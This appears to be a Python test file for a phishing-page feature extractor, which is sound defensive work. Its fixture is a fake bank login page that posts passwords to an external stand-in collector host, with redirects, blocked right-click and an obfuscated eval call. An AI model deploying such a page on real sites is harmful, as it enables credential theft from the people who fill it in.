import json
from pathlib import Path

from app.feature_extractor import extract_features


def sample_document() -> dict:
    return {
        "url": "http://login-secure.example.com/account?next=https%3A%2F%2Fbank.example",
        "title": "Bank Account Login",
        "html": """
        <html>
          <head>
            <title>Bank Account Login</title>
            <meta http-equiv="refresh" content="10;url=https://elsewhere.example">
            <link rel="icon" href="https://cdn.other.example/icon.ico">
          </head>
          <body oncontextmenu="return false">
            <form method="post" action="https://collector.other.example/save">
              <input type="email" name="email">
              <input type="password" name="password">
              <input type="hidden" name="campaign">
              <button type="submit">Sign in</button>
            </form>
            <a href="#">Help</a>
            <a href="https://outside.example">Outside</a>
            <script>eval(atob("YWxlcnQoMSk=")); window.location = "/done";</script>
          </body>
        </html>
        """,
        "metadata": {
            "final_url": "https://login-secure.example.com/account",
            "redirect_count": 1,
            "redirect_history": [{"url": "http://login-secure.example.com/account", "status_code": 301}],
        },
    }


def test_extractor_covers_saved_training_contract():
    features = extract_features(sample_document())
    root = Path(__file__).resolve().parents[3]
    contract = json.loads((root / "adapter" / "deployment_contract.json").read_text())
    expected = set(contract["selected_features"]) | set(contract["dropped_features"])
    missing = expected - set(features)
    assert not missing, f"Missing trained features: {sorted(missing)}"


def test_extractor_detects_credential_and_redirect_risk():
    features = extract_features(sample_document())
    assert features["html.password_input_count"] == 1
    assert features["html.credential_form_present"] == 1
    assert features["html.password_form_external_action_present"] == 1
    assert features["html.javascript_redirect_present"] == 1
    assert features["html.eval_call_count"] == 1
    assert features["metadata.final_scheme_changed"] == 1

